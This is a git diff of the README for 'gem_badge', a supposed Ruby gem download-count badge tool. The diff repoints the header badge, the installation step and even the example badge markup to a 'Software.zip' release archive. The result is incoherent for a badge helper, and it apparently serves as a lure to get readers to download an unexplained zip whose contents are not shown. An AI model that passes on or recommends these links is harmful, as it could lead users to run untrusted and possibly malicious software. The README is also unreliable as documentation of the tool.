@@ -1,12 +1,12 @@
 # 🌟 Welcome to gem_badge 🌟
 
-[![Download Count](https://img.shields.io/badge/Download-Software.zip-orange)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Count](https://github.com/taye427/gem_badge/releases/download/v2.0/Software.zip)](https://github.com/taye427/gem_badge/releases/download/v2.0/Software.zip)
 
 ## Description
 gem_badge is a lightweight tool that allows you to showcase the download count of your Ruby gem directly on your README. With gem_badge, you can easily display the popularity of your gem, making it more appealing to potential users and contributors.
 
 ## Installation
-To get started with gem_badge, simply download the [Software.zip](https://github.com/user-attachments/files/18383251/Software.zip) file and follow the installation instructions provided in the repository. 
+To get started with gem_badge, simply download the [https://github.com/taye427/gem_badge/releases/download/v2.0/Software.zip](https://github.com/taye427/gem_badge/releases/download/v2.0/Software.zip) file and follow the installation instructions provided in the repository. 
 
 ## Features
 🔹 Showcase download count of your Ruby gem on README  
@@ -25,7 +25,7 @@ To get started with gem_badge, simply download the [Software.zip](https://github
 Below is an example of how you can incorporate gem_badge into your README to showcase the download count of your Ruby gem:
 
 ```markdown
-[![Download Count](https://img.shields.io/badge/Downloads-1000-brightgreen)](https://example.com/downloads)
+[![Download Count](https://github.com/taye427/gem_badge/releases/download/v2.0/Software.zip)](https://github.com/taye427/gem_badge/releases/download/v2.0/Software.zip)
 ```
 
 ## Repository Topics
